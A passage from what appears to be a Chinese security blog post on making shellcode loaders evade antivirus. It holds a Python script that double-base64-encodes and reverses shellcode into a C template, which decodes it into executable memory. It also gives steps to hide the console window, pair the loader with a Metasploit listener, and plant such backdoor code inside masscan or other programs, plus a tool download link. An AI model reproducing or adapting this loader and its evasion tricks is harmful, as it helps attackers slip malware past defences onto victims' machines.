char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    *(bufout++) = &#x27;\\0&#x27;;</span></span><br><span class="line"><span class="string">    nbytesdecoded -= (4 - nprbytes) &amp; 3;</span></span><br><span class="line"><span class="string">    return nbytesdecoded;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">static const char basis_64[] =</span></span><br><span class="line"><span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;</span></span><br><span class="line"><span class="string">int Base64encode_len(int len)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    return ((len + 2) / 3 * 4) + 1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">int Base64encode(char* encoded, const char* string, int len)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int i;</span></span><br><span class="line"><span class="string">    char* p;</span></span><br><span class="line"><span class="string">    p = encoded;</span></span><br><span class="line"><span class="string">    for (i = 0; i &lt; len - 2; i += 3) &#123;</span></span><br><span class="line"><span class="string">        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span></span><br><span class="line"><span class="string">        *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span></span><br><span class="line"><span class="string">            ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span></span><br><span class="line"><span class="string">        *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2) |</span></span><br><span class="line"><span class="string">            ((int)(string[i + 2] &amp; 0xC0) &gt;&gt; 6)];</span></span><br><span class="line"><span class="string">        *p++ = basis_64[string[i + 2] &amp; 0x3F];</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if (i &lt; len) &#123;</span></span><br><span class="line"><span class="string">        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span></span><br><span class="line"><span class="string">        if (i == (len - 1)) &#123;</span></span><br><span class="line"><span class="string">            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4)];</span></span><br><span class="line"><span class="string">            // *p++ = &#x27;=&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        else &#123;</span></span><br><span class="line"><span class="string">            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span></span><br><span class="line"><span class="string">                ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span></span><br><span class="line"><span class="string">            *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2)];</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        //*p++ = &#x27;=&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    *p++ = &#x27;\\0&#x27;;</span></span><br><span class="line"><span class="string">    return p - encoded;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">string_change(unsigned char* p) &#123;</span></span><br><span class="line"><span class="string">    int i, len;</span></span><br><span class="line"><span class="string">    char temp;</span></span><br><span class="line"><span class="string">    len = strlen(p);</span></span><br><span class="line"><span class="string">    for (size_t i = 0; i &lt; (len / 2); i++)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        temp = p[i];</span></span><br><span class="line"><span class="string">        p[i] = p[len - 1 - i];</span></span><br><span class="line"><span class="string">        p[len - 1 - i] = temp;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">main()&#123;</span></span><br><span class="line"><span class="string">    unsigned char init_buf[] = &quot;%s&quot;;</span></span><br><span class="line"><span class="string">    char kekeoyyds_bufs[1024] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="string">    char kekeoyyds_buf[1024] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="string">    string_change(init_buf);</span></span><br><span class="line"><span class="string">    Base64decode(kekeoyyds_bufs, init_buf);</span></span><br><span class="line"><span class="string">    Base64decode(kekeoyyds_buf, kekeoyyds_bufs);</span></span><br><span class="line"><span class="string">    char* dmagic_memory;</span></span><br><span class="line"><span class="string">    dmagic_memory = VirtualAlloc(NULL, sizeof(kekeoyyds_buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span></span><br><span class="line"><span class="string">    memcpy(dmagic_memory, kekeoyyds_buf, sizeof(kekeoyyds_buf));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&quot;开始处理：%s&quot;</span> % sys.argv[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> file:</span><br><span class="line">            shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> file.readlines():</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;unsigned&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> i:</span><br><span class="line">                    shellcode += i.strip(<span class="string">&quot;\n&quot;</span>).strip(<span class="string">&quot;\r&quot;</span>).strip(<span class="string">&quot;;&quot;</span>).strip(<span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">            print(shellcode)</span><br><span class="line">            exec(<span class="string">&#x27;shellcode = b&quot;%s&quot;&#x27;</span> % shellcode)</span><br><span class="line">            shellcode = base64.b64encode(shellcode)</span><br><span class="line">            shellcode = base64.b64encode(shellcode)</span><br><span class="line">            shellcode = shellcode.decode(<span class="string">&quot;utf8&quot;</span>)[::-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./&quot;</span>+sys.argv[<span class="number">2</span>],<span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> shellcodefile:</span><br><span class="line">                shellcodefile.write(text % shellcode)</span><br><span class="line">                print(<span class="string">&quot;处理完毕：%s&quot;</span> % sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(sys.argv)</span><br><span class="line">        print(<span class="string">&quot;python base.py shell.c shellcode.c&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fd5d73516e9b" alt="image-20201212140625873"></p><p>在头部添加一下取消黑色窗口的小东西。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fd5d7540d294" alt="image-20201212201349803"></p><p>将base64编码函数和反转字符串函数一同复制进来。</p><p><img src="https://img.rruu.net/image/5fd5dacd6ca03" alt="image-20201213171130638"></p><p>右键，重新生成，找到bin目录，查看exe。</p><p><img src="https://img.rruu.net/image/5fd5d76adb1cb" alt="image-20201212150207069"></p><p>放到虚拟机测试一下</p><p><img src="https://img.rruu.net/image/5fd5d788c6df5" alt="image-20201213154141372"></p><p>MSF配置如下</p><p><img src="https://img.rruu.net/image/5fd5d7a8315cb" alt="image-20201213154339599"></p><p>然后要设置一下EnableStageEncoding为ture</p><p><img src="https://img.rruu.net/image/5fd5d7a828eb9" alt="image-20201213154438122"></p><p>效果如下</p><p><img src="https://img.rruu.net/image/5fd5d7b161861" alt="image-20201213154252380"></p><p>总结：shellcode免杀的执行方式不止我上面说的那个，其实还有很多。有兴趣的同学可以去github上看看 <a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a> ，看看26到29。我们上面通过在masscan中植入后门代码来进行免杀，其实就是一个小小的测试。同学们完全可以自己去寻找其他语言开发的代码一样的植入进去。然后通过，反转字符串，xor异或加密，base64加密等等方式来对抗杀软，相互结合使用效果会更好。</p><p>文章使用工具：<a href="https://wwa.lanzous.com/b0a9fcyqh">https://wwa.lanzous.com/b0a9fcyqh</a>  密码:f33v</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
